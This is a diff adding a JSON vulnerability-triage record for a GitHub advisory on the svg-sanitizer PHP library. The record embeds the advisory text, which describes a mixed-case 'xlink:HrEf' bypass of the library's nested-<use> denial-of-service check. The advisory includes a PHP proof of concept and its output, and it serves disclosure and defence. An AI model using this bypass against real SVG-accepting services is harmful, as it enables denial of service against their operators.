@@ -1,0 +1,60 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"comments\": 1, \"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/3242828?v=4\", \"events_url\": \"https://api.github.com/users/arpitjain099/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/arpitjain099/followers\", \"following_url\": \"https://api.github.com/users/arpitjain099/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/arpitjain099/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/arpitjain099\", \"id\": 3242828, \"login\": \"arpitjain099\", \"node_id\": \"MDQ6VXNlcjMyNDI4Mjg=\", \"organizations_url\": \"https://api.github.com/users/arpitjain099/orgs\", \"received_events_url\": \"https://api.github.com/users/arpitjain099/received_events\", \"repos_url\": \"https://api.github.com/users/arpitjain099/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/arpitjain099/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/arpitjain099/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/arpitjain099\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-107381\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-178\", \"name\": \"Improper Handling of Case Sensitivity\"}, {\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}], \"description\": \"## Summary\\n\\n`Resolver::processReferences()` collects `<use>` elements with the XPath predicate `use[@href or @xlink:href]`, which is case sensitive. A `<use>` element written as `xlink:HrEf` is therefore never added to the reference graph, so the nesting-DoS nullification never marks it for removal. `Sanitizer::cleanHrefAttributes()` then runs later in the same pass and rewrites `xlink:HrEf` back to the canonical `xlink:href`. The sanitizer hands back a fully live nesting bomb that it would have stripped completely had the input used canonical casing.\\n\\nThis is the mirror image of CVE-2025-55166: that fix made href *value* checking case insensitive, but the `<use>` reference graph still selects nodes case sensitively.\\n\\n## Where it is\\n\\n`src/ElementReference/Resolver.php:97-118`, the case-sensitive node selection:\\n\\n```php\\n$useNodeName = $this->xPath->createNodeName('use');\\nforeach ($this->subjects as $subject) {\\n    $useElements = $this->xPath->query(\\n        $useNodeName . '[@href or @xlink:href]',\\n        $subject->getElement()\\n    );\\n```\\n\\n`src/Sanitizer.php:479-504`, the normalization that happens afterwards and makes the attribute live again:\\n\\n```php\\n// in case the attribute name is `HrEf`/`xlink:HrEf`, adjust it to `href`/`xlink:href`\\nif (!in_array($attribute->nodeName, $this->allowedAttrs, true)\\n    && in_array(strtolower($attribute->nodeName), $this->allowedAttrs, true)\\n) {\\n    $element->removeAttribute($attribute->nodeName);\\n    $element->setAttribute(strtolower($attribute->nodeName), $attribute->value);\\n}\\n```\\n\\nOrdering is the whole bug. `Sanitizer::sanitize()` builds the resolver graph first and normalizes attribute casing second, so the graph is built against names the sanitizer is about to change.\\n\\n## Impact\\n\\nAnyone who can submit an SVG to an application that sanitizes it with this library and then serves it. No privileges beyond being able to upload or paste an SVG. The output is the project's own `tests/data/useDosTest.svg` nesting structure, intact, with canonical `xlink:href` attributes, which is exactly the input the `useNestingLimit` machinery exists to defuse.\\n\\n## Proof of concept\\n\\nAgainst a clean clone of tag `0.22.0`. The only change to the input is rewriting `xlink:href` to `xlink:HrEf` in the project's own DoS fixture.\\n\\n```php\\n<?php\\nspl_autoload_register(function ($class) {\\n    $p = 'enshrined\\\\\\\\svgSanitize\\\\\\\\';\\n    if (strpos($class, $p) !== 0) return;\\n    $rel = str_replace('\\\\\\\\', '/', substr($class, strlen($p)));\\n    $f = __DIR__ . '/svgsan/src/' . $rel . '.php';\\n    if (file_exists($f)) require $f;\\n});\\n$orig = file_get_contents(__DIR__ . '/svgsan/tests/data/useDosTest.svg');\\n$mut  = str_replace('xlink:href', 'xlink:HrEf', $orig);\\n\\nfunction run($label, $input) {\\n    $s = new \\\\enshrined\\\\svgSanitize\\\\Sanitizer();\\n    $s->removeRemoteReferences(true);\\n    $out = $s->sanitize($input);\\n    echo \\\"[$label]\\\\n\\\";\\n    echo \\\"  output <use  count : \\\", substr_count($out, '<use '), \\\"\\\\n\\\";\\n    echo \\\"  output xlink:href  : \\\", (strpos($out,'xlink:href')!==false?'YES':'NO'), \\\"\\\\n\\\";\\n    echo \\\"  output xlink:HrEf  : \\\", (strpos($out,'xlink:HrEf')!==false?'YES':'NO'), \\\"\\\\n\\\";\\n}\\nrun('canonical xlink:href (control)', $orig);\\nrun('mixed-case xlink:HrEf (attack)', $mut);\\n```\\n\\nObserved on PHP 8.5.9:\\n\\n```text\\norig use count: 201\\nmutated input has xlink:HrEf: YES\\n\\n[canonical xlink:href (control)]\\n  output <use  count : 0\\n  output xlink:href  : NO\\n  output xlink:HrEf  : NO\\n[mixed-case xlink:HrEf (attack)]\\n  output <use  count : 201\\n  output xlink:href  : YES\\n  output xlink:HrEf  : NO\\n```\\n\\n201 to 0 on canonical input, 201 to 201 on mixed-case input, and the output attribute name comes back canonical either way. To be precise about what I measured: I measured the nullification being skipped and the attribute being re-canonicalized. I did not measure renderer memory or CPU on the resulting file, so the downstream cost is whatever you already assign to `useDosTest.svg`.\\n\\n## Suggested fix\\n\\nStop matching attribute names case sensitively when the reference graph is built. Either select every descendant `use` and resolve the href in PHP with a case-insensitive local-name lookup (an extension of `Helper::getElementHref()` at `Helper.php:10-19` is the smallest change), or move the `cleanHrefAttributes()` canonicalization so it runs before `$this->elementReferenceResolver->collect()` rather than after, so the resolver only ever sees `href` and `xlink:href`. The second option also removes the general class of bug where the graph and the cleaner disagree about a node's identity.\", \"ghsa_id\": \"GHSA-m9xh-6747-9r6f\", \"github_reviewed_at\": \"2026-10-08T19:41:10Z\", \"html_url\": \"https://github.com/advisories/GHSA-m9xh-6747-9r6f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-m9xh-6747-9r6f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-107381\"}], \"nvd_published_at\": null, \"published_at\": \"2026-10-08T19:41:10Z\", \"references\": [\"https://github.com/darylldoyle/svg-sanitizer/security/advisories/GHSA-m9xh-6747-9r6f\", \"https://github.com/darylldoyle/svg-sanitizer/commit/2dff6628314de8519155b7feb218bbe132785757\", \"https://github.com/darylldoyle/svg-sanitizer/releases/tag/1.0.0\", \"https://github.com/advisories/GHSA-m9xh-6747-9r6f\"], \"repository_advisory_url\": \"https://api.github.com/repos/darylldoyle/svg-sanitizer/security-advisories/GHSA-m9xh-6747-9r6f\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/darylldoyle/svg-sanitizer\", \"summary\": \"svg-sanitizer: Mixed-case xlink:HrEf skips the `<use>` nesting-DoS check in Resolver::processReferences\", \"type\": \"reviewed\", \"updated_at\": \"2026-10-08T19:41:11Z\", \"url\": \"https://api.github.com/advisories/GHSA-m9xh-6747-9r6f\", \"vulnerabilities\": [{\"first_patched_version\": \"1.0.0\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"enshrined/svg-sanitize\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.22.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-m9xh-6747-9r6f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "enshrined/svg-sanitize: <= 0.22.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2025-55166",
+      "CVE-2026-107381"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "enshrined/svg-sanitize"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-10-09T19:14:15.420275Z",
+  "provenance": {
+    "content_sha256": "e9a71ad19b33f4f60e165dd0d6934fff54a3f19445fa1623dc81e892fa07d2cb",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-10-08T19:41:10Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-m9xh-6747-9r6f",
+  "status": "active",
+  "title": "svg-sanitizer: Mixed-case xlink:HrEf skips the `<use>` nesting-DoS check in Resolver::processReferences",
+  "updated_at": "2026-10-08T19:41:11Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-m9xh-6747-9r6f"
+}
